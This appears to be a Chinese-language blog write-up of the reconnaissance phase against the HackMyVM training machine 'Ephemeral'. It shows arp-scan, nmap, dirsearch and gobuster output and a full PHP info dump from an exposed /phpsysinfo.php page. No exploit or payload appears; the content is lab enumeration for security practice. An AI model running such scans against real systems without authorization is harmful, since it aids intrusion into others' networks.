---
title: HMV-Ephemeral
description: Enumeration is key.
pubDate: 13 01 2026
image: /mechine/Ephemeral.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768288232424-f832e5f3-f774-4df3-bbbe-71ac13cb1269.png)

# 信息收集
## IP定位
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# arp-scan -l | grep "08:00:27"
192.168.0.100   08:00:27:89:6b:14       PCS Systemtechnik GmbH
```

## nmap扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-13 02:12 EST
Nmap scan report for mail.codeshield.hmv (192.168.0.100)
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:0d:44:3c:38:8f:c0:6d:5d:72:18:e6:d9:12:3e:57 (RSA)
|   256 4d:7d:ba:6f:a9:88:ea:a2:34:3a:6a:0c:3a:27:1c:d5 (ECDSA)
|_  256 74:36:bf:af:8a:53:0a:c1:7f:ca:2e:a1:5c:c5:25:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: AutoWash - Car Wash Website Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

## 目录扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# dirsearch -u http://192.168.0.100

  _|. _ _  _  _  _ _|_    v0.4.3                     
 (_||| _) (/_(_|| (_| )                              
                                                     
Extensions: php, aspx, jsp, html, js
HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/Desktop/hmv/reports/http_192.168.0.100/_26-01-13_02-13-43.txt

Target: http://192.168.0.100/

[02:13:43] Starting:                                 
[02:13:43] 301 -  311B  - /js  ->  http://192.168.0.100/js/
[02:13:44] 403 -  278B  - /.ht_wsr.txt
[02:13:44] 403 -  278B  - /.htaccess.orig
[02:13:44] 403 -  278B  - /.htaccess_orig
[02:13:44] 403 -  278B  - /.htaccess_extra
[02:13:44] 403 -  278B  - /.htaccessBAK
[02:13:44] 403 -  278B  - /.htaccess.bak1
[02:13:44] 403 -  278B  - /.htaccessOLD2
[02:13:44] 403 -  278B  - /.html
[02:13:44] 403 -  278B  - /.htaccess.save
[02:13:44] 403 -  278B  - /.htpasswd_test
[02:13:44] 403 -  278B  - /.htaccess_sc
[02:13:44] 403 -  278B  - /.htaccessOLD
[02:13:44] 403 -  278B  - /.htaccess.sample
[02:13:44] 403 -  278B  - /.htm
[02:13:44] 403 -  278B  - /.httr-oauth
[02:13:44] 403 -  278B  - /.htpasswds
[02:13:45] 403 -  278B  - /.php
[02:13:48] 200 -    3KB - /about.html
[02:14:06] 200 -    3KB - /contact.html
[02:14:07] 301 -  312B  - /css  ->  http://192.168.0.100/css/
[02:14:18] 301 -  312B  - /img  ->  http://192.168.0.100/img/
[02:14:21] 200 -  454B  - /js/
[02:14:22] 200 -  511B  - /lib/
[02:14:22] 301 -  312B  - /lib  ->  http://192.168.0.100/lib/
[02:14:22] 200 -  592B  - /LICENSE.txt
[02:14:25] 301 -  313B  - /mail  ->  http://192.168.0.100/mail/
[02:14:25] 200 -  515B  - /mail/
[02:14:43] 403 -  278B  - /server-status
[02:14:43] 403 -  278B  - /server-status/

Task Completed  
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# gobuster dir -u http://192.168.0.100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.100
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,js,yaml,php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/contact.html         (Status: 200) [Size: 15151]
/blog.html            (Status: 200) [Size: 20094]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.100/img/]                           
/mail                 (Status: 301) [Size: 313] [--> http://192.168.0.100/mail/]                          
/service.html         (Status: 200) [Size: 16853]
/about.html           (Status: 200) [Size: 18464]
/index.html           (Status: 200) [Size: 39494]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.100/css/]                           
/team.html            (Status: 200) [Size: 18605]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.0.100/lib/]                           
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.100/js/]                            
/cd                   (Status: 301) [Size: 311] [--> http://192.168.0.100/cd/]                            
/location.html        (Status: 200) [Size: 14685]
/price.html           (Status: 200) [Size: 14635]
/price                (Status: 301) [Size: 314] [--> http://192.168.0.100/price/]                         
/prices               (Status: 301) [Size: 315] [--> http://192.168.0.100/prices/]                        
/LICENSE.txt          (Status: 200) [Size: 1309]
/single.html          (Status: 200) [Size: 48856]
/booking.html         (Status: 200) [Size: 14677]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/phpsysinfo.php       (Status: 200) [Size: 69419]
/server-status        (Status: 403) [Size: 278]
Progress: 1985031 / 1985040 (100.00%)
===============================================================
Finished
===============================================================
```

```plain
eyIxIjp7IklEIjoxLCJuYW1lIjoiTXkgaWNvbnMgY29sbGVjdGlvbiIsImJvb2ttYXJrX2lkIjoibXdsYTJyMGN2cGEwMDAwMCIsImNyZWF0ZWQiOm51bGwsInVwZGF0ZWQiOjE2MDI0MDM3MTEsImFjdGl2ZSI6MSwic291cmNlIjoibG9jYWwiLCJvcmRlciI6MCwiY29sb3IiOiIwMDAwMDAiLCJzdGF0dXMiOjF9LCJtd2xhMnIwY3ZwYTAwMDAwIjpbeyJpZCI6MjA1MjM1NywidGVhbSI6MCwibmFtZSI6ImNhci1zZXJ2aWNlIiwiY29sb3IiOiIjMDAwMDAwIiwicHJlbWl1bSI6MCwic29ydCI6Mn0seyJpZCI6MjA1MjM5OCwidGVhbSI6MCwibmFtZSI6InNlYXQiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjozfSx7ImlkIjoyMDUyMzQxLCJ0ZWFtIjowLCJuYW1lIjoiY2FyLXNlcnZpY2UiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo0fSx7ImlkIjoyMDUyNDE3LCJ0ZWFtIjowLCJuYW1lIjoiY2FyLXdhc2giLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo1fSx7ImlkIjoyMDUyMzI0LCJ0ZWFtIjowLCJuYW1lIjoiYnJ1c2giLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo2fSx7ImlkIjoyMDUyNDIxLCJ0ZWFtIjowLCJuYW1lIjoidmFjdXVtLWNsZWFuZXIiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo3fSx7ImlkIjoyMDUyMzY0LCJ0ZWFtIjowLCJuYW1lIjoiYnJ1c2giLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo4fSx7ImlkIjoyMDUyMzUzLCJ0ZWFtIjowLCJuYW1lIjoiY2FyLXNlcnZpY2UiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo5fSx7ImlkIjoyMDUyMzkxLCJ0ZWFtIjowLCJuYW1lIjoiY2FyLXNlcnZpY2UiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjoxMH0seyJpZCI6MjA1MjMyMiwidGVhbSI6MCwibmFtZSI6ImNhci13YXNoIiwiY29sb3IiOiIjMDAwMDAwIiwicHJlbWl1bSI6MCwic29ydCI6MX1dfQ==
```

base64解码后得到

> {"1":{"ID":1,"name":"My icons collection","bookmark_id":"mwla2r0cvpa00000","created":null,"updated":1602403711,"active":1,"source":"local","order":0,"color":"000000","status":1},"mwla2r0cvpa00000":[{"id":2052357,"team":0,"name":"car-service","color":"#000000","premium":0,"sort":2},{"id":2052398,"team":0,"name":"seat","color":"#000000","premium":0,"sort":3},{"id":2052341,"team":0,"name":"car-service","color":"#000000","premium":0,"sort":4},{"id":2052417,"team":0,"name":"car-wash","color":"#000000","premium":0,"sort":5},{"id":2052324,"team":0,"name":"brush","color":"#000000","premium":0,"sort":6},{"id":2052421,"team":0,"name":"vacuum-cleaner","color":"#000000","premium":0,"sort":7},{"id":2052364,"team":0,"name":"brush","color":"#000000","premium":0,"sort":8},{"id":2052353,"team":0,"name":"car-service","color":"#000000","premium":0,"sort":9},{"id":2052391,"team":0,"name":"car-service","color":"#000000","premium":0,"sort":10},{"id":2052322,"team":0,"name":"car-wash","color":"#000000","premium":0,"sort":1}]}
>

### /phpsyinfo
```plain
Ephemeral PHP Info Page
PHP logo
PHP Version 7.4.3
System 	Linux ephemeral 5.17.0-051700rc7-generic #202203062330 SMP PREEMPT Sun Mar 6 23:33:35 UTC 2022 x86_64
Build Date 	Mar 2 2022 15:36:52
Server API 	Apache 2.0 Handler
Virtual Directory Support 	disabled
Configuration File (php.ini) Path 	/etc/php/7.4/apache2
Loaded Configuration File 	/etc/php/7.4/apache2/php.ini
Scan this dir for additional .ini files 	/etc/php/7.4/apache2/conf.d
Additional .ini files parsed 	/etc/php/7.4/apache2/conf.d/10-opcache.ini, /etc/php/7.4/apache2/conf.d/10-pdo.ini, /etc/php/7.4/apache2/conf.d/20-calendar.ini, /etc/php/7.4/apache2/conf.d/20-ctype.ini, /etc/php/7.4/apache2/conf.d/20-exif.ini, /etc/php/7.4/apache2/conf.d/20-ffi.ini, /etc/php/7.4/apache2/conf.d/20-fileinfo.ini, /etc/php/7.4/apache2/conf.d/20-ftp.ini, /etc/php/7.4/apache2/conf.d/20-gettext.ini, /etc/php/7.4/apache2/conf.d/20-iconv.ini, /etc/php/7.4/apache2/conf.d/20-json.ini, /etc/php/7.4/apache2/conf.d/20-phar.ini, /etc/php/7.4/apache2/conf.d/20-posix.ini, /etc/php/7.4/apache2/conf.d/20-readline.ini, /etc/php/7.4/apache2/conf.d/20-shmop.ini, /etc/php/7.4/apache2/conf.d/20-sockets.ini, /etc/php/7.4/apache2/conf.d/20-sysvmsg.ini, /etc/php/7.4/apache2/conf.d/20-sysvsem.ini, /etc/php/7.4/apache2/conf.d/20-sysvshm.ini, /etc/php/7.4/apache2/conf.d/20-tokenizer.ini
PHP API 	20190902
PHP Extension 	20190902
Zend Extension 	320190902
Zend Extension Build 	API320190902,NTS
PHP Extension Build 	API20190902,NTS
Debug Build 	no
Thread Safety 	disabled
Zend Signal Handling 	enabled
Zend Memory Manager 	enabled
Zend Multibyte Support 	disabled
IPv6 Support 	enabled
DTrace Support 	available, disabled
Registered PHP Streams	https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar
Registered Stream Socket Transports	tcp, udp, unix, udg, ssl, tls, tlsv1.0, tlsv1.1, tlsv1.2, tlsv1.3
Registered Stream Filters	zlib.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk, convert.iconv.*
Zend logo This program makes use of the Zend Scripting Language Engine:
Zend Engine v3.4.0, Copyright (c) Zend Technologies
    with Zend OPcache v7.4.3, Copyright (c), by Zend Technologies
Configuration
apache2handler
Apache Version 	Apache/2.4.41 (Ubuntu)
Apache API Version 	20120211
Server Administrator 	webmaster@localhost
Hostname:Port 	127.0.1.1:80
User/Group 	www-data(33)/33
Max Requests 	Per Child: 0 - Keep Alive: on - Max Per Connection: 100
Timeouts 	Connection: 300 - Keep-Alive: 5
Virtual Server 	Yes
Server Root 	/etc/apache2
Loaded Modules 	core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status
Directive	Local Value	Master Value
engine	1	1
last_modified	0	0
xbithack	0	0
Apache Environment
Variable	Value
HTTP_HOST 	192.168.0.100
HTTP_USER_AGENT 	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
HTTP_ACCEPT 	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
HTTP_ACCEPT_LANGUAGE 	zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
HTTP_ACCEPT_ENCODING 	gzip, deflate
HTTP_CONNECTION 	keep-alive
HTTP_UPGRADE_INSECURE_REQUESTS 	1
HTTP_PRIORITY 	u=0, i
PATH 	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
SERVER_SIGNATURE 	<address>Apache/2.4.41 (Ubuntu) Server at 192.168.0.100 Port 80</address>
SERVER_SOFTWARE 	Apache/2.4.41 (Ubuntu)
SERVER_NAME 	192.168.0.100
SERVER_ADDR 	192.168.0.100
SERVER_PORT 	80
REMOTE_ADDR 	192.168.0.106
DOCUMENT_ROOT 	/var/www/html
REQUEST_SCHEME 	http
CONTEXT_PREFIX 	no value
CONTEXT_DOCUMENT_ROOT 	/var/www/html
SERVER_ADMIN 	webmaster@localhost
SCRIPT_FILENAME 	/var/www/html/phpsysinfo.php
REMOTE_PORT 	52058
GATEWAY_INTERFACE 	CGI/1.1
SERVER_PROTOCOL 	HTTP/1.1
REQUEST_METHOD 	GET
QUERY_STRING 	no value
REQUEST_URI 	/phpsysinfo.php
SCRIPT_NAME 	/phpsysinfo.php
HTTP Headers Information
HTTP Request Headers
HTTP Request 	GET /phpsysinfo.php HTTP/1.1
Host 	192.168.0.100
User-Agent 	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept 	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language 	zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding 	gzip, deflate
Connection 	keep-alive
Upgrade-Insecure-Requests 	1
Priority 	u=0, i
HTTP Response Headers
calendar
Calendar support 	enabled
Core
PHP Version 	7.4.3
Directive	Local Value	Master Value
allow_url_fopen	On	On
allow_url_include	Off	Off
arg_separator.input	&	&
arg_separator.output	&	&
auto_append_file	no value	no value
auto_globals_jit	On	On
auto_prepend_file	no value	no value
browscap	no value	no value
default_charset	UTF-8	UTF-8
default_mimetype	text/html	text/html
disable_classes	no value	no value
disable_functions	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
display_errors	Off	Off
display_startup_errors	Off	Off
doc_root	no value	no value
docref_ext	no value	no value
docref_root	no value	no value
enable_dl	Off	Off
enable_post_data_reading	On	On
error_append_string	no value	no value
error_log	no value	no value
error_prepend_string	no value	no value
error_reporting	22527	22527
expose_php	Off	Off
extension_dir	/usr/lib/php/20190902	/usr/lib/php/20190902
file_uploads	On	On
hard_timeout	2	2
highlight.comment	#FF8000	#FF8000
highlight.default	#0000BB	#0000BB
highlight.html	#000000	#000000
highlight.keyword	#007700	#007700
highlight.string	#DD0000	#DD0000
html_errors	On	On
ignore_repeated_errors	Off	Off
ignore_repeated_source	Off	Off
ignore_user_abort	Off	Off
implicit_flush	Off	Off
include_path	.:/usr/share/php	.:/usr/share/php
input_encoding	no value	no value
internal_encoding	no value	no value
log_errors	On	On
log_errors_max_len	1024	1024
mail.add_x_header	Off	Off
mail.force_extra_parameters	no value	no value
mail.log	no value	no value
max_execution_time	30	30
max_file_uploads	20	20
max_input_nesting_level	64	64
max_input_time	60	60
max_input_vars	1000	1000
memory_limit	128M	128M
open_basedir	no value	no value
output_buffering	4096	4096
output_encoding	no value	no value
output_handler	no value	no value
post_max_size	8M	8M
precision	14	14
realpath_cache_size	4096K	4096K
realpath_cache_ttl	120	120
register_argc_argv	Off	Off
report_memleaks	On	On
report_zend_debug	On	On
request_order	GP	GP
sendmail_from	no value	no value
sendmail_path	/usr/sbin/sendmail -t -i 	/usr/sbin/sendmail -t -i 
serialize_precision	-1	-1
short_open_tag	Off	Off
SMTP	localhost	localhost
smtp_port	25	25
sys_temp_dir	no value	no value
syslog.facility	LOG_USER	LOG_USER
syslog.filter	no-ctrl	no-ctrl
syslog.ident	php	php
track_errors	Off	Off
unserialize_callback_func	no value	no value
upload_max_filesize	2M	2M
upload_tmp_dir	no value	no value
user_dir	no value	no value
user_ini.cache_ttl	300	300
user_ini.filename	.user.ini	.user.ini
variables_order	GPCS	GPCS
xmlrpc_error_number	0	0
xmlrpc_errors	Off	Off
zend.assertions	-1	-1
zend.detect_unicode	On	On
zend.enable_gc	On	On
zend.exception_ignore_args	On	On
zend.multibyte	Off	Off
zend.script_encoding	no value	no value
zend.signal_check	Off	Off
ctype
ctype functions 	enabled
date
date/time support 	enabled
timelib version 	2018.03
"Olson" Timezone Database Version 	0.system
Timezone Database 	internal
Default timezone 	America/Denver
Directive	Local Value	Master Value
date.default_latitude	31.7667	31.7667
date.default_longitude	35.2333	35.2333
date.sunrise_zenith	90.583333	90.583333
date.sunset_zenith	90.583333	90.583333
date.timezone	no value	no value
exif
EXIF Support 	enabled
Supported EXIF Version 	0220
Supported filetypes 	JPEG, TIFF
Multibyte decoding support using mbstring 	disabled
Extended EXIF tag formats 	Canon, Casio, Fujifilm, Nikon, Olympus, Samsung, Panasonic, DJI, Sony, Pentax, Minolta, Sigma, Foveon, Kyocera, Ricoh, AGFA, Epson
Directive	Local Value	Master Value
exif.decode_jis_intel	JIS	JIS
exif.decode_jis_motorola	JIS	JIS
exif.decode_unicode_intel	UCS-2LE	UCS-2LE
exif.decode_unicode_motorola	UCS-2BE	UCS-2BE
exif.encode_jis	no value	no value
exif.encode_unicode	ISO-8859-15	ISO-8859-15
FFI
FFI support	enabled
Directive	Local Value	Master Value
ffi.enable	preload	preload
ffi.preload	no value	no value
fileinfo
fileinfo support 	enabled
libmagic 	537
filter
Input Validation and Filtering 	enabled
Directive	Local Value	Master Value
filter.default	unsafe_raw	unsafe_raw
filter.default_flags	no value	no value
ftp
FTP support 	enabled
FTPS support 	enabled
gettext
GetText Support 	enabled
hash
hash support 	enabled
Hashing Engines 	md2 md4 md5 sha1 sha224 sha256 sha384 sha512/224 sha512/256 sha512 sha3-224 sha3-256 sha3-384 sha3-512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost gost-crypto adler32 crc32 crc32b crc32c fnv132 fnv1a32 fnv164 fnv1a64 joaat haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5
MHASH support 	Enabled
MHASH API Version 	Emulated Support
iconv
iconv support 	enabled
iconv implementation 	glibc
iconv library version 	2.31
Directive	Local Value	Master Value
iconv.input_encoding	no value	no value
iconv.internal_encoding	no value	no value
iconv.output_encoding	no value	no value
json
json support 	enabled
libxml
libXML support 	active
libXML Compiled Version 	2.9.10
libXML Loaded Version 	20910
libXML streams 	enabled
openssl
OpenSSL support 	enabled
OpenSSL Library Version 	OpenSSL 1.1.1f 31 Mar 2020
OpenSSL Header Version 	OpenSSL 1.1.1f 31 Mar 2020
Openssl default config 	/usr/lib/ssl/openssl.cnf
Directive	Local Value	Master Value
openssl.cafile	no value	no value
openssl.capath	no value	no value
pcre
PCRE (Perl Compatible Regular Expressions) Support 	enabled
PCRE Library Version 	10.34 2019-11-21
PCRE Unicode Version 	12.1.0
PCRE JIT Support 	enabled
PCRE JIT Target 	x86 64bit (little endian + unaligned)
Directive	Local Value	Master Value
pcre.backtrack_limit	1000000	1000000
pcre.jit	1	1
pcre.recursion_limit	100000	100000
PDO
PDO support	enabled
PDO drivers 	no value
Phar
Phar: PHP Archive support	enabled
Phar API version 	1.1.1
Phar-based phar archives 	enabled
Tar-based phar archives 	enabled
ZIP-based phar archives 	enabled
gzip compression 	enabled
bzip2 compression 	disabled (install ext/bz2)
Native OpenSSL support 	enabled
Phar based on pear/PHP_Archive, original concept by Davey Shafik.
Phar fully realized by Gregory Beaver and Marcus Boerger.
Portions of tar implementation Copyright (c) 2003-2009 Tim Kientzle.
Directive	Local Value	Master Value
phar.cache_list	no value	no value
phar.readonly	On	On
phar.require_hash	On	On
posix
POSIX support 	enabled
readline
Readline Support	enabled
Readline library 	EditLine wrapper
Directive	Local Value	Master Value
cli.pager	no value	no value
cli.prompt	\b \> 	\b \> 
Reflection
Reflection 	enabled
session
Session Support 	enabled
Registered save handlers 	files user
Registered serializer handlers 	php_serialize php php_binary
Directive	Local Value	Master Value
session.auto_start	Off	Off
session.cache_expire	180	180
session.cache_limiter	nocache	nocache
session.cookie_domain	no value	no value
session.cookie_httponly	no value	no value
session.cookie_lifetime	0	0
session.cookie_path	/	/
session.cookie_samesite	no value	no value
session.cookie_secure	0	0
session.gc_divisor	1000	1000
session.gc_maxlifetime	1440	1440
session.gc_probability	0	0
session.lazy_write	On	On
session.name	PHPSESSID	PHPSESSID
session.referer_check	no value	no value
session.save_handler	files	files
session.save_path	/var/lib/php/sessions	/var/lib/php/sessions
session.serialize_handler	php	php
session.sid_bits_per_character	5	5
session.sid_length	26	26
session.upload_progress.cleanup	On	On
session.upload_progress.enabled	On	On
session.upload_progress.freq	1%	1%
session.upload_progress.min_freq	1	1
session.upload_progress.name	PHP_SESSION_UPLOAD_PROGRESS	PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.prefix	upload_progress_	upload_progress_
session.use_cookies	1	1
session.use_only_cookies	1	1
session.use_strict_mode	0	0
session.use_trans_sid	0	0
shmop
shmop support 	enabled
sockets
Sockets Support 	enabled
sodium
sodium support	enabled
libsodium headers version 	1.0.18
libsodium library version 	1.0.18
SPL
SPL support	enabled
Interfaces 	OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject
Classes 	AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, CallbackFilterIterator, DirectoryIterator, DomainException, EmptyIterator, FilesystemIterator, FilterIterator, GlobIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, MultipleIterator, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveCallbackFilterIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RecursiveRegexIterator, RecursiveTreeIterator, RegexIterator, RuntimeException, SplDoublyLinkedList, SplFileInfo, SplFileObject, SplFixedArray, SplHeap, SplMinHeap, SplMaxHeap, SplObjectStorage, SplPriorityQueue, SplQueue, SplStack, SplTempFileObject, UnderflowException, UnexpectedValueException
standard
Dynamic Library Support 	enabled
Path to sendmail 	/usr/sbin/sendmail -t -i
Directive	Local Value	Master Value
assert.active	1	1
assert.bail	0	0
assert.callback	no value	no value
assert.exception	0	0
assert.quiet_eval	0	0
assert.warning	1	1
auto_detect_line_endings	0	0
default_socket_timeout	60	60
from	no value	no value
session.trans_sid_hosts	no value	no value
session.trans_sid_tags	a=href,area=href,frame=src,form=	a=href,area=href,frame=src,form=
unserialize_max_depth	4096	4096
url_rewriter.hosts	no value	no value
url_rewriter.tags	form=	form=
user_agent	no value	no value
sysvmsg
sysvmsg support 	enabled
sysvsem
sysvsem support 	enabled
sysvshm
sysvshm support 	enabled
tokenizer
Tokenizer Support 	enabled
Zend OPcache
Opcode Caching 	Up and Running
Optimization 	Enabled
SHM Cache 	Enabled
File Cache 	Disabled
Startup 	OK
Shared memory model 	mmap
Cache hits 	1
Cache misses 	2
Used memory 	9169552
Free memory 	125048176
Wasted memory 	0
Interned Strings Used memory 	189744
Interned Strings Free memory 	6101264
Cached scripts 	2
Cached keys 	2
Max keys 	16229
OOM restarts 	0
Hash keys restarts 	0
Manual restarts 	0
Directive	Local Value	Master Value
opcache.blacklist_filename	no value	no value
opcache.consistency_checks	0	0
opcache.dups_fix	Off	Off
opcache.enable	On	On
opcache.enable_cli	Off	Off
opcache.enable_file_override	Off	Off
opcache.error_log	no value	no value
opcache.file_cache	no value	no value
opcache.file_cache_consistency_checks	1	1
opcache.file_cache_only	0	0
opcache.file_update_protection	2	2
opcache.force_restart_timeout	180	180
opcache.huge_code_pages	Off	Off
opcache.interned_strings_buffer	8	8
opcache.lockfile_path	/tmp	/tmp
opcache.log_verbosity_level	1	1
opcache.max_accelerated_files	10000	10000
opcache.max_file_size	0	0
opcache.max_wasted_percentage	5	5
opcache.memory_consumption	128	128
opcache.opt_debug_level	0	0
opcache.optimization_level	0x7FFEBFFF	0x7FFEBFFF
opcache.preferred_memory_model	no value	no value
opcache.preload	no value	no value
opcache.preload_user	no value	no value
opcache.protect_memory	0	0
opcache.restrict_api	no value	no value
opcache.revalidate_freq	2	2
opcache.revalidate_path	Off	Off
opcache.save_comments	1	1
opcache.use_cwd	On	On
opcache.validate_permission	Off	Off
opcache.validate_root	Off	Off
opcache.validate_timestamps	On	On
zlib
ZLib Support	enabled
Stream Wrapper 	compress.zlib://
Stream Filter 	zlib.inflate, zlib.deflate
Compiled Version 	1.2.11
Linked Version 	1.2.11
Directive	Local Value	Master Value
zlib.output_compression	Off	Off
zlib.output_compression_level	-1	-1
zlib.output_handler	no value	no value
Additional Modules
Module Name
Environment
Variable	Value
APACHE_RUN_DIR 	/var/run/apache2
APACHE_PID_FILE 	/var/run/apache2/apache2.pid
JOURNAL_STREAM 	8:23251
PATH 	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID 	3e18f41ea23e444d91aece512878f6db
APACHE_LOCK_DIR 	/var/lock/apache2
LANG 	C
APACHE_RUN_USER 	www-data
APACHE_RUN_GROUP 	www-data
APACHE_LOG_DIR 	/var/log/apache2
PWD 	/
PHP Variables
Variable	Value
$_SERVER['HTTP_HOST']	192.168.0.100
$_SERVER['HTTP_USER_AGENT']	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
$_SERVER['HTTP_ACCEPT']	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
$_SERVER['HTTP_ACCEPT_LANGUAGE']	zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
$_SERVER['HTTP_ACCEPT_ENCODING']	gzip, deflate
$_SERVER['HTTP_CONNECTION']	keep-alive
$_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']	1
$_SERVER['HTTP_PRIORITY']	u=0, i
$_SERVER['PATH']	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
$_SERVER['SERVER_SIGNATURE']	<address>Apache/2.4.41 (Ubuntu) Server at 192.168.0.100 Port 80</address>
$_SERVER['SERVER_SOFTWARE']	Apache/2.4.41 (Ubuntu)
$_SERVER['SERVER_NAME']	192.168.0.100
$_SERVER['SERVER_ADDR']	192.168.0.100
$_SERVER['SERVER_PORT']	80
$_SERVER['REMOTE_ADDR']	192.168.0.106
$_SERVER['DOCUMENT_ROOT']	/var/www/html
$_SERVER['REQUEST_SCHEME']	http
$_SERVER['CONTEXT_PREFIX']	no value
$_SERVER['CONTEXT_DOCUMENT_ROOT']	/var/www/html
$_SERVER['SERVER_ADMIN']	webmaster@localhost
$_SERVER['SCRIPT_FILENAME']	/var/www/html/phpsysinfo.php
$_SERVER['REMOTE_PORT']	52058
$_SERVER['GATEWAY_INTERFACE']	CGI/1.1
$_SERVER['SERVER_PROTOCOL']	HTTP/1.1
